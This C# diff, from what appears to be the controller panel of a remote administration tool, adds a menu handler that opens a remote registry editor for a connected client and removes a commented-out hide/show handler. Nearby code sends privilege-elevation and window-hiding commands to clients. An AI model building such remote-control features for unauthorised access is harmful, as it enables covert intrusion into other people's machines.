@@ -96,6 +96,16 @@ namespace MosaicServeur.Main
             }
         }
 
+        private void RegistryEditorMenuItem(object sender, RoutedEventArgs e)
+        {
+            if (getClient() != null)
+            {
+                FrmRegistryEditor frmRe = new FrmRegistryEditor(getClient());
+                frmRe.Show();
+                frmRe.Focus();
+            }
+        }
+
         private void RunasMenuItem(object sender, RoutedEventArgs e)
         {
             new Serveur.Packets.ServerPackets.DoAskElevate().Execute(getClient());
@@ -238,17 +248,7 @@ namespace MosaicServeur.Main
                 if (getClient() != null)
                     new MosaiqueServeur.Packets.ServerPackets.HideShow(4).Execute(getClient());
             }
-        }
-
-        private void HideshowMenuItem(object sender, RoutedEventArgs e)
-        {
-            //if (getClient() != null)
-            //{
-                //FrmHideShowFunctions frmHShow = new FrmHideShowFunctions();
-                //frmHShow.ShowDialog();
-                //frmHShow.Focus();
-           //}
-        }
+        }       
 
         /// :: GET CLIENT FROM DATAGRIDVIEW :: ///
         public ClientMosaique getClient()
